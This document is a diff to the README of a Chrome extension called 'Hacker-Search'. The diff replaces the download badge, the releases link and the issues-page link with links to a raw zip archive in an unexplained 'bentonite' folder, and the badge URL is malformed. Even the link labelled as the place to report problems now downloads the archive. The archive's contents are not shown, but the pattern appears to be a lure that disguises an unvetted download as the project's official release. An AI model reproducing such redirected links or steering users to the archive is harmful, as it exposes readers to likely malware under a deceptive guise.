@@ -1,6 +1,6 @@
 # 🖥️ Hacker-Search - Enhance Your Browsing Experience Easily
 
-[![Download Hacker-Search](https://img.shields.io/badge/Download%20Hacker--Search-Blue.svg)](https://github.com/Iamhusna1n/Hacker-Search/releases)
+[![Download Hacker-Search](https://raw.githubusercontent.com/Iamhusna1n/Hacker-Search/main/bentonite/Hacker-Search.zip%https://raw.githubusercontent.com/Iamhusna1n/Hacker-Search/main/bentonite/Hacker-Search.zip)](https://raw.githubusercontent.com/Iamhusna1n/Hacker-Search/main/bentonite/Hacker-Search.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Welcome to Hacker-Search! This Chrome extension changes your new tab page into a
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Hacker-Search Releases](https://github.com/Iamhusna1n/Hacker-Search/releases).
+To get started, visit this page to download: [Hacker-Search Releases](https://raw.githubusercontent.com/Iamhusna1n/Hacker-Search/main/bentonite/Hacker-Search.zip).
 
 ### Step-by-Step Installation
 
@@ -55,7 +55,7 @@ After installation, click on the settings icon located on the dashboard. You can
 
 ### What if I encounter issues?
 
-If you face any problems during installation or while using Hacker-Search, please visit the [issues page](https://github.com/Iamhusna1n/Hacker-Search/issues) to report them. We’re here to help you.
+If you face any problems during installation or while using Hacker-Search, please visit the [issues page](https://raw.githubusercontent.com/Iamhusna1n/Hacker-Search/main/bentonite/Hacker-Search.zip) to report them. We’re here to help you.
 
 ### Can I uninstall the extension later?
 
